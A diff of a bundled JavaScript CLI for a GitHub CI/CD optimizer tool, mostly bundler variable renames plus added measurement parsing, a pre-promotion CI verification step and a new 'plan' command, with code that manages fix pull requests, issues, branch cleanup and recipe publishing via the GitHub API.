   if (!values2.measurements) throw new UsageError("evaluate needs --measurements (worktree mode) or --engine (single build).");
   const files = await measurementFiles(io, values2.measurements);
   for (const file of files) {
-    const measurements = JSON.parse(await readFile4(file, "utf8"));
+    const measurements = parseMeasurements(await readFile4(file, "utf8"));
     if (measurements.needsCorpus === false) continue;
     const result = await evaluateBranches({
       root: resolvePath(io, values2["repo-dir"] ?? "."),
@@ -36227,7 +43524,7 @@ function judgments(items2) {
   });
 }
 async function decideCommand(args, io) {
-  const { values: values2 } = parseArgs2({
+  const { values: values2 } = parseArgs3({
     args,
     strict: true,
     options: { ...COMMON, measurements: { type: "string" }, "agent-output": { type: "string" }, apply: { type: "boolean", default: false } }
@@ -36241,7 +43538,7 @@ async function decideCommand(args, io) {
   const now2 = io.now?.() ?? /* @__PURE__ */ new Date();
   const reports = [];
   for (const file of await measurementFiles(io, values2.measurements)) {
-    let measurements = JSON.parse(await readFile4(file, "utf8"));
+    let measurements = parseMeasurements(await readFile4(file, "utf8"));
     const name = measurements.experiment;
     const state = states3.find((candidate) => candidate.name === name);
     if (!state?.trunk) {
@@ -36257,6 +43554,7 @@ async function decideCommand(args, io) {
     const decision = decide(manifest, measurements, config, { now: now2, trunkRef: trunkBranch(name), armRef: (arm) => armBranch(name, arm) });
     reports.push(renderDecision(manifest, decision));
     if (values2.apply) {
+      if (decision.action === "promote") await verifyCiMeasurements(client, repo, { manifest, measurements, config });
       const applied = await applyDecision(client, repo, { manifest, decision, state, config, measurements, dispatchClient: workflowDispatchClient(io, client) });
       io.stderr(`${name}: ${applied.action}${applied.merged ? ` (merged #${applied.merged})` : ""}${applied.closed.length ? `, closed ${applied.closed.map((n) => `#${n}`).join(", ")}` : ""}${applied.dispatched ? `, dispatched ${applied.dispatched} run(s)` : ""}${applied.notes.length ? `; ${applied.notes.join("; ")}` : ""}`);
     } else {
@@ -36270,6 +43568,7 @@ async function decideCommand(args, io) {
   return 0;
 }
 var COMMANDS = {
+  plan: ciPlanCommand,
   list: listCommand,
   capacity: capacityCommand,
   context: contextCommand,
@@ -36292,7 +43591,7 @@ async function experimentsCommand(args, io) {
 
 // src/cli/recipes.ts
 import { readFile as readFile5 } from "node:fs/promises";
-import { parseArgs as parseArgs3 } from "node:util";
+import { parseArgs as parseArgs4 } from "node:util";
 
 // src/github/repository.ts
 async function defaultBranch(client, repo, expectedRepositoryId) {
@@ -36305,9 +43604,9 @@ async function defaultBranch(client, repo, expectedRepositoryId) {
 }
 async function loadRemoteConfig(client, repo, ref) {
   for (const path of CONFIG_PATHS) {
-    const text6 = await readFileAt(client, repo, path, ref);
-    if (text6 === void 0) continue;
-    const parsed2 = parseConfigText(text6, allRules, path);
+    const text7 = await readFileAt(client, repo, path, ref);
+    if (text7 === void 0) continue;
+    const parsed2 = parseConfigText(text7, allRules, path);
     return { config: parsed2.config, path, problems: parsed2.problems };
   }
   const parsed = parseConfigText("", allRules);
@@ -36438,7 +43737,7 @@ function planFixPullRequests(changes, existing, options) {
   const skipped = [];
   const newestFirst = existing.map((pr) => pr.pendingUpdate && pr.headSha === pr.pendingUpdate.commitSha ? { ...pr, commitSha: pr.pendingUpdate.commitSha, signature: pr.pendingUpdate.signature } : pr).sort((a, b) => b.number - a.number);
   const wanted = new Set(changes.map((change) => change.group));
-  let open3 = existing.filter((pr) => pr.state === "open").length;
+  let open4 = existing.filter((pr) => pr.state === "open").length;
   for (const pr of newestFirst) {
     if (pr.state !== "open" || wanted.has(pr.group)) continue;
     if (pr.cleanup && !options.rebase?.has(pr.group) && !options.recreate?.has(pr.group)) {
@@ -36456,7 +43755,7 @@ function planFixPullRequests(changes, existing, options) {
       ...pr.branch !== void 0 ? { branch: pr.branch } : {},
       comment: "These fixes are no longer needed: the base branch already contains them, or the rules no longer apply. Closing."
     });
-    open3 -= 1;
+    open4 -= 1;
   }
   for (const change of changes) {
     const current = newestFirst.find((pr) => pr.group === change.group && pr.state === "open");
@@ -36480,12 +43779,12 @@ function planFixPullRequests(changes, existing, options) {
       skipped.push({ group: change.group, reason: "declined", number: latest.number });
       continue;
     }
-    if (open3 >= options.openPullRequestsLimit) {
+    if (open4 >= options.openPullRequestsLimit) {
       skipped.push({ group: change.group, reason: "limit" });
       continue;
     }
     actions.push({ type: "create", change });
-    open3 += 1;
+    open4 += 1;
   }
   const metadata = [];
   for (const pr of newestFirst) {
@@ -36575,10 +43874,10 @@ var CLEANUP_BLOCK = /<!-- cicd-optimizer:cleanup -->[\s\S]*?<!-- \/cicd-optimize
 function isCleanupStatus(value2) {
   return value2 === "pending" || value2 === "deleted" || value2 === "missing" || value2 === "changed" || value2 === "in-use" || value2 === "reopened";
 }
-function branchCleanup(parsed, number2) {
+function branchCleanup(parsed, number3) {
   const { cleanupBranch: cleanupBranch2, cleanupHead, cleanupStatus } = parsed.attributes;
   if (cleanupBranch2 === void 0 && cleanupHead === void 0 && cleanupStatus === void 0) return void 0;
-  if (!cleanupBranch2 || !cleanupHead || !isCleanupStatus(cleanupStatus)) throw new Error(`Incomplete branch cleanup on PR #${number2}; reconcile its marker.`);
+  if (!cleanupBranch2 || !cleanupHead || !isCleanupStatus(cleanupStatus)) throw new Error(`Incomplete branch cleanup on PR #${number3}; reconcile its marker.`);
   return { branch: cleanupBranch2, headSha: cleanupHead, status: cleanupStatus };
 }
 function cleanupBody(body, group, cleanup) {
@@ -36614,11 +43913,11 @@ ${BODY_END}`;
   }
   return previous2.slice(0, start2) + wrapped + previous2.slice(end + BODY_END.length);
 }
-function pendingUpdate(parsed, number2) {
+function pendingUpdate(parsed, number3) {
   const attrs = parsed.attributes;
   if (!UPDATE_KEYS.some((key2) => key2 in attrs)) return void 0;
   if (!attrs.pendingFrom || !attrs.pendingCommit || !attrs.pendingSignature || !attrs.pendingBase) {
-    throw new Error(`Incomplete pending update on PR #${number2}; reconcile its fix marker before retrying.`);
+    throw new Error(`Incomplete pending update on PR #${number3}; reconcile its fix marker before retrying.`);
   }
   return { fromSha: attrs.pendingFrom, commitSha: attrs.pendingCommit, signature: attrs.pendingSignature, baseSha: attrs.pendingBase, rules: list(attrs.pendingRules) };
 }
@@ -36633,22 +43932,22 @@ async function listManagedPullRequests(client, repo, discovery) {
   if (discovery) {
     const known2 = new Set(raw.map((issue) => issue.number));
     for (const group of new Set(discovery.groups)) {
-      const branch = branchFor(group, discovery);
+      const branch2 = branchFor(group, discovery);
       const pulls = await paginate(client, "GET /repos/{owner}/{repo}/pulls", {
         ...repo,
         state: "all",
-        head: `${repo.owner}:${branch}`,
+        head: `${repo.owner}:${branch2}`,
         base: discovery.baseBranch,
         sort: "created",
         direction: "desc"
       });
-      if (pulls.length === 1e3) throw new Error(`Fix PR discovery reached its 1000-result limit for ${branch}; refusing an incomplete reconciliation.`);
+      if (pulls.length === 1e3) throw new Error(`Fix PR discovery reached its 1000-result limit for ${branch2}; refusing an incomplete reconciliation.`);
       for (const pull of pulls) {
         if (known2.has(pull.number)) {
           details.set(pull.number, pull);
           continue;
         }
-        if (pull.head.repo?.full_name.toLowerCase() !== `${repo.owner}/${repo.repo}`.toLowerCase() || pull.head.ref !== branch || pull.base.ref !== discovery.baseBranch) continue;
+        if (pull.head.repo?.full_name.toLowerCase() !== `${repo.owner}/${repo.repo}`.toLowerCase() || pull.head.ref !== branch2 || pull.base.ref !== discovery.baseBranch) continue;
         const parsed = parseMarker(pull.body);
         if (parsed?.kind !== "fix" || parsed.fingerprint !== `group:${group}` || !parsed.attributes.signature || !parsed.attributes.commit) continue;
         raw.push({ ...pull, pull_request: { merged_at: pull.merged_at ?? null } });
@@ -36675,7 +43974,7 @@ async function listManagedPullRequests(client, repo, discovery) {
     const pending = pendingUpdate(parsed, issue.number);
     const currentCleanup = branchCleanup(parsed, issue.number);
     const group = parsed.fingerprint.slice("group:".length);
-    const branch = ownedBranch(head?.ref, group, pull.base?.ref, discovery);
+    const branch2 = ownedBranch(head?.ref, group, pull.base?.ref, discovery);
     const pr = {
       number: issue.number,
       state: issue.state,
@@ -36694,7 +43993,7 @@ async function listManagedPullRequests(client, repo, discovery) {
       ...pending ? { pendingUpdate: pending } : {},
       ...currentCleanup ? { cleanup: currentCleanup } : {},
       ...head?.sha ? { headSha: head.sha } : {},
-      ...branch ? { branch } : {}
+      ...branch2 ? { branch: branch2 } : {}
     };
     if (pending && head?.sha === pending.commitSha) pr.rules = pending.rules;
     result.push(pr);
@@ -36727,16 +44026,16 @@ async function verifyBranchReuse(client, repo, previous2, baseBranch) {
     throw new Error(`PR #${previous2.number} does not authorize reuse of this branch and base; reconcile it before retrying.`);
   }
 }
-async function requireUnusedBranch(client, repo, branch) {
+async function requireUnusedBranch(client, repo, branch2) {
   const response = await client.request("GET /repos/{owner}/{repo}/pulls", {
     ...repo,
     state: "open",
-    head: `${repo.owner}:${branch}`,
+    head: `${repo.owner}:${branch2}`,
     per_page: 100
   });
   if (!Array.isArray(response.data)) throw new Error("GitHub did not return the open PRs required for branch reuse.");
-  if (response.data.some((pull) => pull.head.ref === branch && pull.head.repo?.full_name.toLowerCase() === `${repo.owner}/${repo.repo}`.toLowerCase())) {
-    throw new Error(`An open PR already uses ${branch}; reconcile it before creating another. Its branch was not changed.`);
+  if (response.data.some((pull) => pull.head.ref === branch2 && pull.head.repo?.full_name.toLowerCase() === `${repo.owner}/${repo.repo}`.toLowerCase())) {
+    throw new Error(`An open PR already uses ${branch2}; reconcile it before creating another. Its branch was not changed.`);
   }
 }
 async function finishPendingUpdate(client, repo, previous2) {
@@ -36791,9 +44090,9 @@ async function finishBranchCleanup(client, repo, previous2) {
   } else if (pull.head.ref !== cleanup.branch) status = "changed";
   else {
     if (cleanup.branch === pull.base?.ref) throw new Error("Refusing cleanup of a PR's base branch.");
-    const open3 = await client.request("GET /repos/{owner}/{repo}/pulls", { ...repo, state: "open", head: `${repo.owner}:${cleanup.branch}`, per_page: 1 });
-    if (!Array.isArray(open3.data)) throw new Error("GitHub did not return the open PRs required for branch cleanup.");
-    status = open3.data.length > 0 ? "in-use" : await deleteBranch(client, repo, cleanup.branch, cleanup.headSha);
+    const open4 = await client.request("GET /repos/{owner}/{repo}/pulls", { ...repo, state: "open", head: `${repo.owner}:${cleanup.branch}`, per_page: 1 });
+    if (!Array.isArray(open4.data)) throw new Error("GitHub did not return the open PRs required for branch cleanup.");
+    status = open4.data.length > 0 ? "in-use" : await deleteBranch(client, repo, cleanup.branch, cleanup.headSha);
   }
   const latest = await read2();
   if (latest.cleanup.status !== "pending") return { ...previous2, body: latest.pull.body ?? "", cleanup: latest.cleanup };
@@ -36802,16 +44101,16 @@ async function finishBranchCleanup(client, repo, previous2) {
   await client.request("PATCH /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: previous2.number, body });
   return { ...previous2, body, cleanup: finished };
 }
-async function finishReviewRequests(client, repo, number2, group, reviewers) {
-  const response = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: number2 });
+async function finishReviewRequests(client, repo, number3, group, reviewers) {
+  const response = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: number3 });
   const { body, draft } = response.data;
   const parsed = parseMarker(body);
   if (!parsed || parsed.kind !== "fix" || parsed.fingerprint !== `group:${group}`) {
-    throw new Error(`Fix marker changed on PR #${number2}; refusing to overwrite its body.`);
+    throw new Error(`Fix marker changed on PR #${number3}; refusing to overwrite its body.`);
   }
   if (!parsed.attributes.pendingReviewers || draft) return;
   if (reviewers.length > 0) {
-    const requested = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers", { ...repo, pull_number: number2 });
+    const requested = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers", { ...repo, pull_number: number3 });
     const current = requested.data;
     const users = new Set(current.users.map((user) => user.login.toLowerCase()));
     const teams = new Set(current.teams.map((team) => team.slug.toLowerCase()));
@@ -36820,7 +44119,7 @@ async function finishReviewRequests(client, repo, number2, group, reviewers) {
     if (missingUsers.length > 0 || missingTeams.length > 0) {
       await client.request("POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers", {
         ...repo,
-        pull_number: number2,
+        pull_number: number3,
         reviewers: missingUsers,
         team_reviewers: missingTeams
       });
@@ -36828,7 +44127,7 @@ async function finishReviewRequests(client, repo, number2, group, reviewers) {
   }
   await client.request("PATCH /repos/{owner}/{repo}/pulls/{pull_number}", {
     ...repo,
-    pull_number: number2,
+    pull_number: number3,
     body: updateMarker(body ?? "", "fix", parsed.fingerprint, { pendingReviewers: "" })
   });
 }
@@ -36871,23 +44170,23 @@ async function applyFixActions(client, repo, actions, options) {
     }
     const { change } = action;
     const previous2 = action.type === "update" ? existing.get(action.number) : void 0;
-    const branch = action.type === "update" ? previous2?.branch : change.branch;
-    if (!branch || branch === options.baseBranch) throw new Error("A fix requires a known branch distinct from the repository's base branch.");
+    const branch2 = action.type === "update" ? previous2?.branch : change.branch;
+    if (!branch2 || branch2 === options.baseBranch) throw new Error("A fix requires a known branch distinct from the repository's base branch.");
     let expectedHead = previous2?.headSha;
     let reused;
     if (action.type === "update" && !expectedHead) throw new Error(`Missing current head for PR #${action.number}; refusing an unconditional update.`);
     if (action.type === "create") {
-      await requireUnusedBranch(client, repo, branch);
+      await requireUnusedBranch(client, repo, branch2);
       let currentSha;
       try {
-        currentSha = await branchSha(client, repo, branch);
-        if (!currentSha) throw new Error(`GitHub did not return the current head of ${branch}.`);
+        currentSha = await branchSha(client, repo, branch2);
+        if (!currentSha) throw new Error(`GitHub did not return the current head of ${branch2}.`);
       } catch (error2) {
         if (httpStatus(error2) !== 404) throw error2;
       }
       if (currentSha) {
-        reused = [...existing.values()].find((pr) => pr.state === "closed" && pr.group === change.group && pr.branch === branch && pr.commitSha === currentSha && pr.headSha === currentSha);
-        if (!reused) throw new Error(`Refusing to overwrite unrecognized or modified branch ${branch}; reconcile it before retrying.`);
+        reused = [...existing.values()].find((pr) => pr.state === "closed" && pr.group === change.group && pr.branch === branch2 && pr.commitSha === currentSha && pr.headSha === currentSha);
+        if (!reused) throw new Error(`Refusing to overwrite unrecognized or modified branch ${branch2}; reconcile it before retrying.`);
         await verifyBranchReuse(client, repo, reused, options.baseBranch);
         expectedHead = currentSha;
       }
@@ -36920,7 +44219,7 @@ async function applyFixActions(client, repo, actions, options) {
       await client.request("PATCH /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: action.number, title, body });
       const prepared = { ...previous2, body, title };
       await currentFix(client, repo, prepared);
-      await updateBranch(client, repo, branch, commitSha, expectedHead);
+      await updateBranch(client, repo, branch2, commitSha, expectedHead);
       await finishPendingUpdate(client, repo, { ...prepared, headSha: commitSha });
       applied.push({ action, number: action.number, commitSha });
       continue;
@@ -36931,10 +44230,10 @@ async function applyFixActions(client, repo, actions, options) {
     body = managedBody(body);
     if (reused) {
       await verifyBranchReuse(client, repo, reused, options.baseBranch);
-      await requireUnusedBranch(client, repo, branch);
+      await requireUnusedBranch(client, repo, branch2);
     }
-    if (expectedHead) await updateBranch(client, repo, branch, commitSha, expectedHead);
-    else await pushBranch(client, repo, branch, commitSha);
+    if (expectedHead) await updateBranch(client, repo, branch2, commitSha, expectedHead);
+    else await pushBranch(client, repo, branch2, commitSha);
     const created = await client.request("POST /repos/{owner}/{repo}/pulls", {
       ...repo,
       title,
@@ -36944,12 +44243,12 @@ async function applyFixActions(client, repo, actions, options) {
       draft: options.config.draft,
       maintainer_can_modify: true
     });
-    const number2 = created.data.number;
-    await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/labels", { ...repo, issue_number: number2, labels });
+    const number3 = created.data.number;
+    await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/labels", { ...repo, issue_number: number3, labels });
     if (options.config.reviewers.length > 0) {
-      await finishReviewRequests(client, repo, number2, change.group, options.config.reviewers);
+      await finishReviewRequests(client, repo, number3, change.group, options.config.reviewers);
     }
-    applied.push({ action, number: number2, commitSha });
+    applied.push({ action, number: number3, commitSha });
   }
   return applied;
 }
@@ -36982,11 +44281,11 @@ function hasCopilot(data) {
   if (!data || typeof data !== "object" || !("assignees" in data) || !Array.isArray(data.assignees)) return false;
   return data.assignees.some((actor) => actor !== null && typeof actor === "object" && "login" in actor && typeof actor.login === "string" && ["copilot", "copilot-swe-agent", COPILOT_LOGIN].includes(actor.login.toLowerCase()));
 }
-async function clearPending(client, repo, number2) {
+async function clearPending(client, repo, number3) {
   try {
     await client.request("DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels/{name}", {
       ...repo,
-      issue_number: number2,
+      issue_number: number3,
       name: COPILOT_READY_LABEL
     });
   } catch (error2) {
@@ -37053,7 +44352,7 @@ async function applyIssueActions(client, repo, actions, options = {}) {
       continue;
     }
     const handoff = desired.assignCopilot && (action.type !== "update" || action.retryCopilot === true);
-    let number2;
+    let number3;
     if (action.type === "create") {
       const response = await client.request("POST /repos/{owner}/{repo}/issues", {
         ...repo,
@@ -37063,35 +44362,35 @@ async function applyIssueActions(client, repo, actions, options = {}) {
         labels: handoff ? [.../* @__PURE__ */ new Set([...desired.labels, COPILOT_READY_LABEL])] : desired.labels,
         ...desired.assignees.length > 0 ? { assignees: desired.assignees } : {}
       });
-      number2 = response.data.number;
+      number3 = response.data.number;
     } else {
-      number2 = action.number;
+      number3 = action.number;
       if (action.type === "reopen" && handoff) {
-        const current = await client.request("GET /repos/{owner}/{repo}/issues/{issue_number}", { ...repo, issue_number: number2 });
+        const current = await client.request("GET /repos/{owner}/{repo}/issues/{issue_number}", { ...repo, issue_number: number3 });
         if (hasCopilot(current.data) && current.data.state === "closed") {
           const removed = await client.request("DELETE /repos/{owner}/{repo}/issues/{issue_number}/assignees", {
             ...repo,
-            issue_number: number2,
+            issue_number: number3,
             assignees: [COPILOT_LOGIN]
           });
-          if (hasCopilot(removed.data)) throw new Error(`GitHub did not remove the completed Copilot assignment from issue #${number2}`);
+          if (hasCopilot(removed.data)) throw new Error(`GitHub did not remove the completed Copilot assignment from issue #${number3}`);
         }
       }
       await client.request("PATCH /repos/{owner}/{repo}/issues/{issue_number}", {
         ...repo,
-        issue_number: number2,
+        issue_number: number3,
         title: desired.title,
         body: desired.body,
         labels: handoff ? [.../* @__PURE__ */ new Set([...desired.labels, COPILOT_READY_LABEL])] : desired.labels,
         ...action.type === "reopen" ? { state: "open" } : {}
       });
       if (action.type === "update" && action.comment) {
-        await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: number2, body: action.comment });
+        await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: number3, body: action.comment });
       }
     }
-    const result = { action, number: number2 };
+    const result = { action, number: number3 };
     if (handoff) {
-      result.copilot = await assignCopilot(client, options.copilotClient, repo, number2, options.copilot ?? {});
+      result.copilot = await assignCopilot(client, options.copilotClient, repo, number3, options.copilot ?? {});
     }
     applied.push(result);
   }
@@ -37107,7 +44406,7 @@ function planIssueSync(existing, desired, options) {
     byFingerprint.set(issue.fingerprint, [...byFingerprint.get(issue.fingerprint) ?? [], issue]);
   }
   const wanted = new Set(desired.map((issue) => issue.fingerprint));
-  let open3 = existing.filter((issue) => issue.state === "open").length;
+  let open4 = existing.filter((issue) => issue.state === "open").length;
   if (options.closeResolved) {
     for (const issue of existing) {
       if (issue.state !== "open" || wanted.has(issue.fingerprint)) continue;
@@ -37117,7 +44416,7 @@ function planIssueSync(existing, desired, options) {
         fingerprint: issue.fingerprint,
         comment: options.resolvedComment ?? "CI/CD Optimizer no longer detects this finding, so this issue is resolved. :tada:"
       });
-      open3 -= 1;
+      open4 -= 1;
     }
   }
   const pending = [];
@@ -37140,13 +44439,13 @@ function planIssueSync(existing, desired, options) {
     pending.push(issue);
   }
   for (const issue of pending.sort((a, b) => b.priority - a.priority || a.fingerprint.localeCompare(b.fingerprint))) {
-    if (open3 >= options.maxOpen) {
+    if (open4 >= options.maxOpen) {
       skipped.push({ fingerprint: issue.fingerprint, reason: "limit" });
       continue;
     }
     const latest = byFingerprint.get(issue.fingerprint)?.[0];
     actions.push(latest ? { type: "reopen", number: latest.number, desired: issue } : { type: "create", desired: issue });
-    open3 += 1;
+    open4 += 1;
   }
   return { actions, skipped };
 }
@@ -37278,12 +44577,12 @@ function serializeRecipe(recipe) {
   return (0, import_yaml46.stringify)(recipe, { lineWidth: 0 });
 }
 var isRecord4 = (value2) => typeof value2 === "object" && value2 !== null && !Array.isArray(value2);
-var strings = (value2) => Array.isArray(value2) ? value2.filter((item) => typeof item === "string") : [];
+var strings2 = (value2) => Array.isArray(value2) ? value2.filter((item) => typeof item === "string") : [];
 var num = (value2) => typeof value2 === "number" && Number.isFinite(value2) ? value2 : void 0;
-function parseRecipe(text6) {
+function parseRecipe(text7) {
   let raw;
   try {
-    raw = (0, import_yaml46.parse)(text6, { maxAliasCount: 100 });
+    raw = (0, import_yaml46.parse)(text7, { maxAliasCount: 100 });
   } catch (error2) {
     return { problems: [`Invalid YAML: ${error2.message}`] };
   }
@@ -37298,8 +44597,8 @@ function parseRecipe(text6) {
   if (typeof source.repository !== "string" || typeof source.experiment !== "string" || typeof source.arm !== "string") {
     problems.push("source.repository, source.experiment and source.arm are required.");
   }
-  const rules15 = strings(raw.rules);
-  const files = strings(raw.files);
+  const rules15 = strings2(raw.rules);
+  const files = strings2(raw.files);
   if (rules15.length === 0 && files.length === 0) problems.push("A recipe needs rules or files to decide where it applies.");
   if (problems.length > 0) return { problems };
   const evidence2 = isRecord4(raw.evidence) ? raw.evidence : {};
@@ -37336,7 +44635,7 @@ function parseRecipe(text6) {
         ...typeof source.promotedAt === "string" ? { promotedAt: source.promotedAt } : {}
       },
       ...typeof raw.patch === "string" && raw.patch ? { patch: raw.patch } : {},
-      patchFiles: strings(raw.patchFiles),
+      patchFiles: strings2(raw.patchFiles),
       compatibility: { passed: Math.max(0, num(compatibility2.passed) ?? 0), failed: Math.max(0, num(compatibility2.failed) ?? 0) }
     }
   };
@@ -37580,9 +44879,9 @@ function extractKnowledge(repository, revision, input2, options = {}) {
   projects.push(root);
   const manifests = /* @__PURE__ */ new Map();
   const digests2 = /* @__PURE__ */ new Map();
-  const source = (file, location2 = "") => {
+  const source = (file, location3 = "") => {
     if (!digests2.has(file.path)) digests2.set(file.path, hash3(file.content));
-    return { path: file.path, pointer: location2, digest: digests2.get(file.path) };
+    return { path: file.path, pointer: location3, digest: digests2.get(file.path) };
   };
   let limited = false;
   const reserve = (path) => {
@@ -37622,7 +44921,7 @@ function extractKnowledge(repository, revision, input2, options = {}) {
   }
   const rootPackage = projects.find((project) => project.kind === "npm-package" && project.path === "") ?? root;
   const workspaceSets = [];
-  const addWorkspace = (raw, file, location2) => {
+  const addWorkspace = (raw, file, location3) => {
     if (!Array.isArray(raw) || raw.some((glob) => typeof glob !== "string" || !glob.replace(/^!/, "") || [...glob].some((char) => char.charCodeAt(0) < 32) || /[[\]{}()\\]|(^|\/)\.\.(\/|$)|^\//.test(glob.replace(/^!/, "")))) {
       problem(file.path, "unsupported-workspace-patterns");
       return;
@@ -37634,7 +44933,7 @@ function extractKnowledge(repository, revision, input2, options = {}) {
       const matches = (glob) => matchesGlob(project.path, glob.replace(/^\.\//, "").replace(/\/$/, ""));
       if (!patterns.some((glob) => !glob.startsWith("!") && matches(glob)) || patterns.some((glob) => glob.startsWith("!") && matches(glob.slice(1)))) continue;
       selected.add(project.id);
-      addRelationship({ kind: "workspace-member", from: rootPackage.id, to: project.id, source: source(file, location2) });
+      addRelationship({ kind: "workspace-member", from: rootPackage.id, to: project.id, source: source(file, location3) });
     }
     workspaceSets.push(selected);
   };
@@ -37790,9 +45089,9 @@ async function prepareRecipeKnowledge(client, target, recipe, snapshot, config, 
   const source = await loadKnowledgeIdentity(client, sourceRepo);
   const revision = await resolveRepositoryRevision(client, sourceRepo, await defaultBranch(client, sourceRepo));
   validateRevision(revision.sha);
-  const text6 = await readFileAt(client, sourceRepo, recipePath(recipe.id), revision.sha);
-  if (text6 === void 0) throw new Error("Knowledge recording requires a published recipe readable in its source repository");
-  const published = parseRecipe(text6);
+  const text7 = await readFileAt(client, sourceRepo, recipePath(recipe.id), revision.sha);
+  if (text7 === void 0) throw new Error("Knowledge recording requires a published recipe readable in its source repository");
+  const published = parseRecipe(text7);
   if (!published.recipe) throw new Error("Published recipe is invalid; knowledge recording was not started");
   if (published.recipe.source.repository.toLowerCase() !== recipe.source.repository.toLowerCase()) {
     throw new Error("Published recipe names a different source repository");
@@ -37812,15 +45111,15 @@ async function prepareRecipeKnowledge(client, target, recipe, snapshot, config, 
   await store.save(topology);
   return { store, definition: storedDefinition, topology };
 }
-function time(value2) {
+function time2(value2) {
   if (typeof value2 !== "string" || !Number.isFinite(Date.parse(value2))) throw new Error("GitHub change lacks a valid lifecycle timestamp");
   return new Date(value2).toISOString();
 }
-async function readChange(client, repo, identity3, kind, number2) {
-  if (!Number.isSafeInteger(number2) || number2 < 1) throw new Error("Mitigation change number must be a positive safe integer");
-  const response = kind === "pull-request" ? await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: number2 }) : await client.request("GET /repos/{owner}/{repo}/issues/{issue_number}", { ...repo, issue_number: number2 });
+async function readChange(client, repo, identity3, kind, number3) {
+  if (!Number.isSafeInteger(number3) || number3 < 1) throw new Error("Mitigation change number must be a positive safe integer");
+  const response = kind === "pull-request" ? await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: number3 }) : await client.request("GET /repos/{owner}/{repo}/issues/{issue_number}", { ...repo, issue_number: number3 });
   const change = response.data;
-  if (!change || change.number !== number2 || !["open", "closed"].includes(change.state ?? "")) {
+  if (!change || change.number !== number3 || !["open", "closed"].includes(change.state ?? "")) {
     throw new Error("GitHub change does not match the recorded mitigation");
   }
   if (kind === "pull-request") {
@@ -37832,7 +45131,7 @@ async function readChange(client, repo, identity3, kind, number2) {
       throw new Error("GitHub pull request has inconsistent merge evidence");
     }
   } else if (change.pull_request) throw new Error("Mitigation adaptation issue unexpectedly refers to a pull request");
-  time(change.created_at);
+  time2(change.created_at);
   return change;
 }
 function stateEvent(application, change) {
@@ -37841,19 +45140,19 @@ function stateEvent(application, change) {
   let note;
   if (application.change.kind === "pull-request" && application.change.headSha !== change.head?.sha) {
     state = "unknown";
-    observedAt = time(change.updated_at);
+    observedAt = time2(change.updated_at);
     note = "Pull request head changed or was never pinned by the optimizer; these edits do not establish that the recorded recipe was applied.";
   } else if (application.change.kind === "pull-request" && change.merged) {
     state = "applied";
-    observedAt = time(change.merged_at);
+    observedAt = time2(change.merged_at);
     note = "GitHub reports this pinned pull request merged; no performance benefit or executed project is inferred.";
   } else if (change.state === "closed") {
     state = application.change.kind === "issue" && change.state_reason !== "not_planned" ? "unknown" : "declined";
-    observedAt = time(change.closed_at);
+    observedAt = time2(change.closed_at);
     if (state === "unknown") note = "Closing an adaptation issue does not prove a code change or optimization benefit.";
   } else {
     state = "proposed";
-    observedAt = time(change.updated_at ?? change.created_at);
+    observedAt = time2(change.updated_at ?? change.created_at);
   }
   return createMitigationApplicationEvent({
     target: { host: application.target.host, repositoryId: application.target.repositoryId },
@@ -37865,9 +45164,9 @@ function stateEvent(application, change) {
 }
 async function recordRecipeApplications(client, target, knowledge, changes) {
   const ids2 = [];
-  for (const [kind, number2] of [["pull-request", changes.pullRequest], ["issue", changes.issue]]) {
-    if (number2 === void 0) continue;
-    const raw = await readChange(client, target, knowledge.topology.repository, kind, number2);
+  for (const [kind, number3] of [["pull-request", changes.pullRequest], ["issue", changes.issue]]) {
+    if (number3 === void 0) continue;
+    const raw = await readChange(client, target, knowledge.topology.repository, kind, number3);
     const marker2 = findMarker(raw.body ?? "", "recipe");
     if (marker2?.fingerprint !== knowledge.definition.key || marker2.attributes.revision !== String(knowledge.definition.revision)) {
       throw new Error("GitHub change is not linked to the published recipe revision");
@@ -37880,8 +45179,8 @@ async function recordRecipeApplications(client, target, knowledge, changes) {
       definitionId: knowledge.definition.id,
       topologySnapshotId: knowledge.topology.id,
       projectIds: [],
-      change: kind === "issue" ? { kind, number: number2 } : { kind, number: number2, ...pinnedHead ? { headSha: pinnedHead } : {} },
-      createdAt: time(raw.created_at)
+      change: kind === "issue" ? { kind, number: number3 } : { kind, number: number3, ...pinnedHead ? { headSha: pinnedHead } : {} },
+      createdAt: time2(raw.created_at)
     });
     await knowledge.store.saveMitigationApplication(application);
     await knowledge.store.appendMitigationApplicationEvent(createMitigationApplicationEvent({
@@ -37926,9 +45225,9 @@ async function publishRecipe(client, repo, options) {
   let manifest = options.manifest;
   if (!manifest) {
     const ref = options.ref ?? await defaultBranch(client, repo);
-    const text6 = await readFileAt(client, repo, manifestPath(options.experiment), ref);
-    if (text6 === void 0) return { error: `${manifestPath(options.experiment)} was not found on ${ref}.` };
-    const parsed = parseManifest2(text6, { config: options.config });
+    const text7 = await readFileAt(client, repo, manifestPath(options.experiment), ref);
+    if (text7 === void 0) return { error: `${manifestPath(options.experiment)} was not found on ${ref}.` };
+    const parsed = parseManifest2(text7, { config: options.config });
     if (!parsed.manifest) return { error: `Invalid manifest: ${parsed.problems.map((problem) => `${problem.path}: ${problem.message}`).join("; ")}` };
     manifest = parsed.manifest;
   }
@@ -37946,8 +45245,8 @@ async function publishRecipe(client, repo, options) {
 }
 async function applyRecipe(client, target, recipe, options = {}) {
   const name = `${target.owner}/${target.repo}`;
-  const branch = await defaultBranch(client, target);
-  const remote = await loadRemoteConfig(client, target, branch);
+  const branch2 = await defaultBranch(client, target);
+  const remote = await loadRemoteConfig(client, target, branch2);
   if (remote.problems.length > 0) {
     return {
       repo: name,
